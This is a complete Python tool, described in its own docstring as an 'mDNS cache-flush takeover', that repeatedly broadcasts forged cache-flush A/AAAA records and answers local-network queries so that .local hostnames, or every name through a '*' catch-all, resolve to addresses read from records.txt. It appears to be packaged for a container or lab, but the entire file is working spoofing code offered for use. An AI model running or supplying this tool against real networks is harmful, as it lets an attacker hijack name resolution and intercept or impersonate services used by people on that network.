#!/usr/bin/env python3
"""mDNS cache-flush takeover. Reads records.txt (<hostname> <ip>, or
<*.hostname> <ip> for wildcard queries), announces and answers queries.
"""
import ipaddress
import os
import select
import socket
import struct
import sys
import time

from dnslib import AAAA, A, DNSHeader, DNSRecord, QTYPE, RR

MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353
CACHE_FLUSH_CLASS = 0x8001  # CLASS_IN | cache-flush bit

RECORDS_FILE = os.environ.get("RECORDS_FILE", "/app/records.txt")
INTERVAL = float(os.environ.get("INTERVAL", "2"))
TTL = int(os.environ.get("TTL", "5"))


def load_records(path):
    records = []
    with open(path, "r") as f:
        for lineno, raw in enumerate(f, 1):
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) != 2:
                print(f"records.txt:{lineno}: skipping malformed line: {raw!r}", file=sys.stderr)
                continue
            hostname, ip = parts
            if hostname == "*":
                pass
            elif hostname.startswith("*."):
                base = hostname[2:]
                if not base.endswith(".local"):
                    base += ".local"
                hostname = "*." + base
            elif not hostname.endswith(".local"):
                hostname += ".local"
            try:
                addr = ipaddress.ip_address(ip)
            except ValueError:
                print(f"records.txt:{lineno}: invalid IP {ip!r}, skipping", file=sys.stderr)
                continue
            rtype = QTYPE.AAAA if addr.version == 6 else QTYPE.A
            records.append((hostname, rtype, ip))
    catchall = next((r for r in records if r[0] == "*"), None)
    if catchall:
        print("records.txt: '*' present, ignoring all other records", file=sys.stderr)
        return [catchall]
    return records


def build_response(matches, ttl):
    """Build one mDNS response for the given records, all cache-flush (0x8001)."""
    rrs = []
    for hostname, rtype, ip in matches:
        rdata = AAAA(ip) if rtype == QTYPE.AAAA else A(ip)
        rrs.append(RR(rname=hostname, rtype=rtype, rclass=CACHE_FLUSH_CLASS, ttl=ttl, rdata=rdata))
    return DNSRecord(DNSHeader(id=0, qr=1, aa=1), rr=rrs).pack()


def hostname_matches(hostname, qname):
    if hostname == "*":
        return True
    if hostname.startswith("*."):
        base = hostname[2:]
        return qname == base or qname.endswith("." + base)
    return hostname == qname


def matching_records(records, query):
    """Wildcard hostnames answer with the queried name."""
    matches = []
    for question in query.questions:
        qname = str(question.qname).rstrip(".").lower()
        for hostname, rtype, ip in records:
            if not hostname_matches(hostname.rstrip(".").lower(), qname):
                continue
            if question.qtype not in (rtype, QTYPE.ANY):
                continue
            answer_name = qname if hostname.startswith("*") else hostname
            match = (answer_name, rtype, ip)
            if match not in matches:
                matches.append(match)
    return matches


def handle_query(sock, records, data):
    try:
        query = DNSRecord.parse(data)
    except Exception:
        return
    if query.header.qr != 0:  # ignore responses (incl. our own)
        return
    matches = matching_records(records, query)
    if matches:
        sock.sendto(build_response(matches, TTL), (MDNS_ADDR, MDNS_PORT))


def make_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if hasattr(socket, "SO_REUSEPORT"):
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    sock.bind(("", MDNS_PORT))
    mreq = struct.pack("4s4s", socket.inet_aton(MDNS_ADDR), socket.inet_aton("0.0.0.0"))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
    return sock


def describe_records(records):
    for hostname, rtype, ip in records:
        print(f"  {hostname} {QTYPE.get(rtype)} -> {ip}")


def main():
    records = load_records(RECORDS_FILE)
    if not records:
        print(f"No valid records found in {RECORDS_FILE}, exiting.", file=sys.stderr)
        sys.exit(1)

    print(f"Loaded {len(records)} record(s) from {RECORDS_FILE}:")
    describe_records(records)
    print(f"Announcing (cache-flush, TTL={TTL}) every {INTERVAL}s, answering queries, on {MDNS_ADDR}:{MDNS_PORT}")

    sock = make_socket()
    concrete = [r for r in records if not r[0].startswith("*")]
    packet = build_response(concrete, TTL) if concrete else None
    last_mtime = os.stat(RECORDS_FILE).st_mtime
    next_send = time.monotonic()

    while True:
        timeout = max(0.0, next_send - time.monotonic())
        ready, _, _ = select.select([sock], [], [], timeout)
        if ready:
            try:
                data, _ = sock.recvfrom(4096)
                handle_query(sock, records, data)
            except OSError as exc:
                print(f"recv failed: {exc}", file=sys.stderr)

        if time.monotonic() < next_send:
            continue
        next_send = time.monotonic() + INTERVAL

        try:
            mtime = os.stat(RECORDS_FILE).st_mtime
        except OSError as exc:
            print(f"stat failed: {exc}", file=sys.stderr)
            mtime = last_mtime
        if mtime != last_mtime:
            new_records = load_records(RECORDS_FILE)
            if new_records:
                records = new_records
                concrete = [r for r in records if not r[0].startswith("*")]
                packet = build_response(concrete, TTL) if concrete else None
                print(f"Reloaded {len(records)} record(s) from {RECORDS_FILE}:")
                describe_records(records)
            else:
                print(f"{RECORDS_FILE} changed but has no valid records, keeping previous set", file=sys.stderr)
            last_mtime = mtime

        if packet:
            try:
                sock.sendto(packet, (MDNS_ADDR, MDNS_PORT))
            except OSError as exc:
                print(f"send failed: {exc}", file=sys.stderr)


if __name__ == "__main__":
    main()
